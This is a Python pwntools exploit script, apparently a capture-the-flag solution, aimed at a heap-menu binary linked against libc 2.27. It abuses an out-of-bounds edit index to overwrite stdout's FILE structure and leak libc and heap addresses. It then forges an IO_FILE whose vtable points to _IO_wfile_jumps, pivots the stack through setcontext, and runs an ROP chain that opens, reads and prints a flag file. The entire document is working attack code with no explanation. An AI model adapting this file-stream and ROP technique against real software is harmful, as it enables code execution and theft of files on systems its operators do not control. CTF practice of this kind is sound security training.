#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('./libc-2.27.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(choice):
    ru(b'command >>> ')
    sl(i2b(choice))
def add(size, content):
    cmd(1)
    ru(b'please input size: ')
    sl(i2b(size))
    ru(b'Next, the content: ')
    s(content)
def delet(idx):
    cmd(2)
    ru(b'id: ')
    sl(i2b(idx))
def edit(idx, content):
    cmd(3)
    ru(b'id: ')
    sl(i2b(idx))
    ru(b'content: ')
    s(content)

first_freed = 0x6091b8
list_start  = 0x6091d0
stdout_addr = 0x6090a0

add(0x600, b"aaa")

payload = p64(0x0FBAD1887) +p64(0)*3 + p8(0x58)
edit((stdout_addr - list_start)//8, payload)
libc_base = u64_ex(rn(8)) - 0x3e82a0
lg("libc_base")
cmd(10)

payload = p64(0x0FBAD1887) +p64(0)*3 + p64(list_start) + p64(list_start+0x40)*3
edit((stdout_addr - list_start)//8, payload)
chunk_addr = u64_ex(rn(8))
lg("chunk_addr")

pop_rbp_ret = libc_base + 0x00000000000213e3
leave_ret   = libc_base + 0x00000000000547e3
pop_rdi_ret = libc_base + 0x0000000000086388
pop_rsi_ret = libc_base + 0x0000000000023a6a
pop_rdx_ret = libc_base + 0x0000000000001b96
syscall_ret = libc_base + 0x00000000000d2625
pop_rax_ret = libc_base + 0x000000000001b500

_lock = libc_base + 0x3ed8c0
_IO_write_base = libc_base + 0x3ec7e3
fake_file = IO_FILE_plus_struct()
fake_file._IO_write_base = _IO_write_base
fake_file._IO_write_ptr  = _IO_write_base
fake_file._IO_write_end  = _IO_write_base
#  fake_file.flags = u64_ex("  hack!")
fake_file.flags = chunk_addr + 0x300
fake_file._lock = _lock
fake_file._wide_data = chunk_addr
fake_file.vtable = libc_base + libc.sym._IO_wfile_jumps
fake_file.unknown2 = pop_rbp_ret


payload = flat({
    0: {
        0x00: chunk_addr + 0x300,
        0x08: leave_ret,
        0x18: 0,
        0x20: _IO_write_base,
        0x28: _IO_write_base,
        0x30: 0,
        0x130: chunk_addr+0x200
    },
    0x200: {
        0x68: libc_base + libc.sym.setcontext + 53
    },
    0x300: {
        #  0x00: u64_ex(b'/flag\x00')
        0x00: 0xdeadbeef
    }
})
payload += p64(pop_rdi_ret) + p64(chunk_addr + 0x500)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(2)
payload += p64(syscall_ret)
payload += p64(pop_rdi_ret) + p64(3)
payload += p64(pop_rsi_ret) + p64(chunk_addr+0x400)
payload += p64(pop_rdx_ret) + p64(0x100)
payload += p64(libc_base + libc.sym.read)
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(pop_rsi_ret) + p64(chunk_addr+0x400)
payload += p64(pop_rdx_ret) + p64(0x100)
payload += p64(libc_base + libc.sym.write)
payload = payload.ljust(0x500, b'a')
payload += p64(u64_ex(b'/home/ct'))
payload += p64(u64_ex(b'f/flag.t'))
payload += p64(u64_ex(b'xt\x00'))
edit(0, payload)

payload = bytes(fake_file)
edit((stdout_addr - list_start)//8, payload)

ia()

